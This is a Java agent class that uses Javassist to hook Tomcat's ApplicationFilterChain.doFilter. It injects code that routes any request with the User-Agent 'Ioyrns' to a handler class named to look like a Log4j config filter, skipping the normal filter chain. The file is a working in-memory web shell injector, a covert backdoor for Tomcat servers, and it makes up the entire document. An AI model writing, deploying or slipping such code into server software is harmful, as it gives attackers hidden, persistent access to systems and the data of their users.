import javassist.*;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className,
                            Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
                            byte[] classFileBuffer) {

        if (!"org/apache/catalina/core/ApplicationFilterChain".equals(className)) {
            return null;
        }

        try {
            ClassPool pool = ClassPool.getDefault();
            pool.appendClassPath(new LoaderClassPath(loader));

            CtClass cc = pool.makeClass(new ByteArrayInputStream(classFileBuffer));
            CtMethod doFilter = cc.getDeclaredMethod("doFilter");

            doFilter.insertBefore(
                    "{ " +
                            "    javax.servlet.http.HttpServletRequest req = $1;" +
                            "    javax.servlet.http.HttpServletResponse res = $2;" +
                            "    String ua = req.getHeader(\"User-Agent\");" +
                            "    if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
                            "        com.filter.Log4jConfigPdFilter log4jConfigPdFilter = " +
                            "            com.filter.Log4jConfigPdFilter.getInstance(Thread.currentThread().getContextClassLoader());" +
                            "        log4jConfigPdFilter.execute(req, res);" +
                            "        return;" +
                            "    }" +
                            "}"
            );

            System.out.println("[+] Hooked doFilter, caching Log4jConfigPdFilter instance.");
            byte[] bytecode = cc.toBytecode();
            cc.detach();
            return bytecode;

        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }
}